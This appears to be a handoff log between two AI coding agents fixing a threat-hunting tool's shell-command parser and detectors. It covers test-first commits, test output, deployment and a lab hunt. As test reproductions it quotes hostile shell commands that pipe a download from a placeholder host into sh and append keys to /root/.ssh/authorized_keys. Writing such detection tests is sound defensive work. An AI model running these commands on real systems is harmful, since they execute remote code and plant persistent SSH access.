
---

## 2026-10-18 · Claude → Codex: GATE RE-RUN FIX ROUND. Execute only; no planning step.

**Gate re-run results (independent reviewers, reproduced by probe):**
- **Investigator: PASS WITH ISSUES.** Your B1, B2 and B3 are fixed, including the two-worker interleave and migration `0003` on an existing DB.
- **Core: FAIL.** B1–B6 and I11 are fixed. B7 is only partly fixed, and there are two new Blocking items.
- Claude already fixed core N3 (sequence-pair raw copies lost across partitions) in `b332dac`. 211 tests pass.

**Implement the items below now, test-first, one commit per item, in this order. Do not write a plan, design or approval request first.** Items 1–2 are Blocking; 3–5 are small follow-ups.

### 1 (core N1, Blocking): the tokenizer still treats shell data as commands
`src/romulus/evidence/shellparse.py`: backslash-escaped punctuation isn't protected, `#` comments are parsed as code, and the newline-as-separator change from `6b4d2b1` turned heredoc bodies into commands, a regression. Reproductions (each currently produces a false finding):
- `bash -c 'cat > /tmp/README <<EOF\ncurl http://e/install | sh\nEOF'` → urgent `host.download_piped_to_shell`
- the same heredoc with `echo key >> /root/.ssh/authorized_keys` in the body → high `host.ssh_authorized_keys_write`
- `echo usage: \; curl http://e/i \| sh` → urgent
- `apt-get update # then; curl http://e | sh` → urgent

**Done when:** escaped punctuation is literal; `#` at the start of an unquoted word comments to end of line; heredocs (`<<`, `<<-`) are either skipped correctly up to their delimiter or make the parse `ok=False`. Each reproduction above is a fixture that produces no match.

### 2 (core N2, Blocking): a failed or unmodelled parse produces a complete negative
`src/romulus/detect/host.py`: `DownloadPipedToShell` and `AuthorizedKeysWrite` return `[]` when `parsed.ok` is False, and nothing marks the record unevaluable, so the cell becomes `no_match_complete`. Command substitution (`$(...)`, backticks) is executed by bash but never evaluated. Reproductions:
- `bash -c "curl http://e/x | sh; echo $'it\'s'"` (shlex can't parse it) → `no_match_complete`
- `bash -c 'x=$(curl http://e/x | sh)'` → `no_match_complete`

**Done when:** every shell-script rule counts scripts that can't be parsed, or that contain command substitution or heredocs, as unevaluable through a playbook counter, so the cell becomes `evaluated_partial` (the sweep already treats `missing_required` that way; reuse it or add an equivalent counter). Fault-injection fixtures cover both reproductions.

### 3 (investigator N1, Important): pivot data-plane writes aren't fenced
`src/romulus/hunt/pivot.py` task, evidence and candidate writes go through `repo.upsert_task`, `update_task`, `save_evidence` and `save_candidate` with no owner token. A worker displaced between heartbeats can still write evidence and publish a candidate after the new owner finishes.

**Done when:** `owner_token` is passed through `PivotExecutor` and `publish_match` into those writes and fenced inside the same transaction, and a test displaces a worker during normalization and proves no write lands.

### 4 (investigator N2, Minor): `resume_hunt` doesn't guard contract preflight failures
`src/romulus/hunt/run.py`. **Done when:** a preflight failure during resume sets a terminal or partial state with the owner token, like `run_hunt` does, and has a test.

### 5 (investigator N3, Minor): `ids_alerts` still advertises host entities
`src/romulus/agent/tools.py`. **Done when:** the catalog and validator accept only `ip` entities for `ids_alerts`.

### Rules
Same as before:
- Don't change decision-policy lanes or the read-only allowlist.
- Don't undo `7d019b9`, `2663e1d` or `b332dac`.
- Never read `/home/user/romulus-eval/` or touch v1.
- Only stop for owner-only needs or a §1 conflict with no safe option.

### Verify, then hand back
- Run the full suite and the archmap check.
- Deploy from PowerShell with `scripts/deploy.ps1 -SkipInstall` and confirm the printed commit matches `HEAD`.
- Run one model-off lab hunt over 2024-11-18T10:00Z–17:30Z. Expect `completed_within_scope`, 0 normalization errors, 0 broken citations, and the same 7 urgent / 11 high finding counts unless a fix legitimately changes them; if they change, explain which finding and why.
- Append `Gate re-run fix results` below with commits, exact commands and real output tails.
- Then stop. Claude will re-run the core gate.

---

## 2026-10-18 · Codex → Claude: Gate re-run fix results

All five requested items are implemented in order, test-first, with one code commit per item. No detection lane, decision-policy rule, or read-only source allowlist was changed. I did not read `/home/user/romulus-eval/` or touch v1.

### Commits

1. `8b274fe fix(evidence): distinguish shell data from commands`
2. `741025e fix(detect): mark unmodelled shell scripts partial`
3. `073a121 fix(pivot): fence persisted results by lease owner`
4. `5a6a9cf fix(hunt): close lease on resume preflight failure`
5. `82c1372 fix(agent): restrict IDS alert pivots to IPs`
6. `8a09957 docs: record gate rerun requests` (committed the tracked Claude handoff so deployment had a clean, exact commit stamp)
7. `f9c2b53 docs: record gate rerun verification` (STATUS/MILESTONES evidence)

### What changed

#### 1. Shell data is no longer parsed as executable commands

- `src/romulus/evidence/shellparse.py`
  - Backslash-escaped shell punctuation is replaced with protected sentinels before `shlex`, so escaped `;` and `|` remain argv data instead of command/pipeline operators.
  - `#` starts a comment only at the start of an unquoted word; content through the end of that line is discarded.
  - Unquoted `<<` and `<<-` fail closed with `ParsedScript.ok=False` and `error="heredoc syntax is not modelled"`. I chose the spec-approved unevaluable path instead of implementing heredoc body skipping.
- Fixtures prove that the heredoc download/pipe body, heredoc `authorized_keys` body, escaped operators, and comment tail produce no detector match. Quoted heredoc-looking text remains data because detection is quote-aware.

#### 2. Unparseable and unmodelled scripts produce partial coverage

- `src/romulus/evidence/shellparse.py`
  - Active `$()` and backtick command substitution (outside single quotes, including inside double quotes) now fail closed as unmodelled.
- `src/romulus/detect/host.py`
  - `host.download_piped_to_shell` and `host.ssh_authorized_keys_write` increment the existing `missing_required` playbook counter when shell parsing is unevaluable.
  - `Sweep` already maps any per-partition `missing_required` delta to `evaluated_partial`, so no new coverage semantics were introduced.
- Sweep-level fixtures cover both supplied reproductions:
  - `curl http://e/x | sh; echo $'it\\'s'`
  - `x=$(curl http://e/x | sh)`
  Both detector cells persist as `evaluated_partial` with `detail.missing_required == 1`.

#### 3. Pivot data-plane writes are owner-fenced

- `src/romulus/store/repo.py`
  - Added optional keyword-only `owner_token` to `upsert_task`, `update_task`, `save_evidence`, and `save_candidate`.
  - Each method calls `_fence_lease` inside the same write transaction as its mutation. `update_task` resolves the task's hunt inside that transaction before fencing.
- `src/romulus/hunt/publish.py`
  - `publish_match` accepts and passes `owner_token` to evidence and candidate writes.
- `src/romulus/hunt/pivot.py`
  - `PivotExecutor` carries the owner token through task creation/transitions, evidence retention, and direct-playbook publication.
- `src/romulus/hunt/run.py`
  - `_run_investigator` supplies the claimed owner token to `PivotExecutor`.
- The hostile interleave test reclaims and completes the hunt from a second worker inside normalization. The stale executor raises `hunt h1 lease ownership lost`; no typed event, raw record, or candidate lands, and its task remains at the last pre-displacement state (`leased`).

#### 4. Resume preflight failure releases the lease

- `src/romulus/hunt/run.py`
  - `_contracts` during `resume_hunt` is guarded like initial-run preflight.
  - On failure it writes a fenced `hunt.agent_summary`, transitions the hunt to `failed` with the owner token, releases the lease through the normal terminal-state path, preserves the already-finished sweep summary, and re-raises the source error.
- The integration fixture verifies `failed`, `lease_until is None`, the exact `source preflight error`, preserved `hunt.sweep_summary.finished=True`, and a failed agent summary.

#### 5. `ids_alerts` accepts IPs only

- `src/romulus/agent/tools.py`
  - The strict validator now rejects every non-IP entity with `entity must be an IP`.
  - The model-facing catalog advertises `entity {kind: ip, ...}` and “known IP” only.
- The executor's defense-in-depth hostile host guard remains tested by constructing a deliberately unvalidated Pydantic instance; it still refuses execution and never queries network `host.name`.

### Files changed

Production:

- `src/romulus/agent/tools.py`
- `src/romulus/detect/host.py`
- `src/romulus/evidence/shellparse.py`
- `src/romulus/hunt/pivot.py`
- `src/romulus/hunt/publish.py`
- `src/romulus/hunt/run.py`
- `src/romulus/store/repo.py`

Tests:

- `tests/test_agent_cases.py`
- `tests/test_agent_pivot.py`
- `tests/test_evidence.py`
- `tests/test_hunt_agent.py`
- `tests/test_playbooks.py`
- `tests/test_sweep.py`

Project evidence/handoff:

- `docs/project/STATUS.md`
- `docs/project/MILESTONES.md`
- `Claude-Codex.md`

### Test-first evidence and final local verification

Each item was observed red before production edits:

- Item 1 focused run: `8 failed` (escaped punctuation, comment, `<<`/`<<-`, both false detector findings), then `8 passed`.
- Item 2 focused run: `4 failed` (`$()`, backticks, and both complete-negative cells), then `4 passed`.
- Item 3 focused run: `Failed: DID NOT RAISE RuntimeError`, then `1 passed` after transaction fencing.
- Item 4 focused run: expected `failed`, observed stale `running`, then the complete hunt-agent file passed (`12 passed`).
- Item 5 focused run: host entity did not raise validation, then agent schema+pivot files passed (`25 passed`).

Required full command:

```text
.\\.venv\\Scripts\\python -m pytest -q -p no:warnings
........................................................................ [ 31%]
........................................................................ [ 62%]
........................................................................ [ 93%]
................                                                         [100%]
exit 0
```

Collection output totals 232 tests:

```text
tests/test_agent_acceptance.py: 2
tests/test_agent_cases.py: 6
tests/test_agent_controller.py: 10
tests/test_agent_ollama.py: 6
tests/test_agent_pivot.py: 19
tests/test_agent_store.py: 7
tests/test_agent_validation.py: 8
tests/test_config.py: 6
tests/test_delete.py: 6
tests/test_evidence.py: 27
tests/test_hunt_agent.py: 12
tests/test_playbooks.py: 73
tests/test_report.py: 7
tests/test_sources_es.py: 25
tests/test_sweep.py: 12
tests/test_web.py: 6
```

Architecture check:

```text
.\\.venv\\Scripts\\python scripts\\archmap.py --check
exit 0 (no output)
```

### Deployment and live model-off run

Deployment command and exact output:

```text
powershell -File scripts/deploy.ps1 -SkipInstall
deployed commit 8a09957: Claude-Codex.md CLAUDE.md DEPLOYED_COMMIT docs ENGINEERING_MASTER_PROMPT.md pyproject.toml scripts src tests
```

`8a09957` exactly matched the clean local `HEAD` at deployment time. The later `f9c2b53` commit changes only STATUS/MILESTONES after live results were known.

Hunt command:

```text
ssh romulus-vm '/home/user/romulus-v2/venv/bin/romulus --env-file /home/user/romulus-v2/.env hunt start --start 2024-11-18T10:00:00Z --end 2024-11-18T17:30:00Z --no-agent'
```

Real completion tail:

```text
hunt h20261018-232714-ad664a created [2024-11-18T10:00:00+00:00, 2024-11-18T17:30:00+00:00)
done: completed_within_scope reportable_findings lanes={'context': 504, 'high': 11, 'lead': 79, 'urgent': 7} stats={'partitions': 19, 'records': 1791438, 'events': 296500, 'candidates': 601, 'errors': 0}
```

Persisted status:

```text
h20261018-232714-ad664a  completed_within_scope   reportable_findings                      lanes={'context': 504, 'high': 11, 'lead': 79, 'urgent': 7} agent=disabled unworked=97 partial_pivots=0 analyst_flags=0
```

Report command/output:

```text
ssh romulus-vm '/home/user/romulus-v2/venv/bin/romulus --env-file /home/user/romulus-v2/.env report h20261018-232714-ad664a'
revision 1: 97 findings/leads, broken citations=0
  /home/user/romulus-v2/reports/h20261018-232714-ad664a/h20261018-232714-ad664a-r1.json
  /home/user/romulus-v2/reports/h20261018-232714-ad664a/h20261018-232714-ad664a-r1.md
```

The expected 7 urgent / 11 high counts were unchanged. No integration result is inferred: the output above is from the actual VM deployment and live model-off hunt. I did not run a live model-enabled hunt in this round because the handoff requested one model-off run.

### Spec disagreements and open work

- Spec disagreements: none. Heredocs use the explicitly allowed `ok=False` path, and the existing coverage counter is reused exactly as requested.
- Open: Claude must re-run the core gate. The M1 reviewer checkbox and owner demo remain open. Previously documented live-model effectiveness gaps remain open; this round did not attempt model tuning.
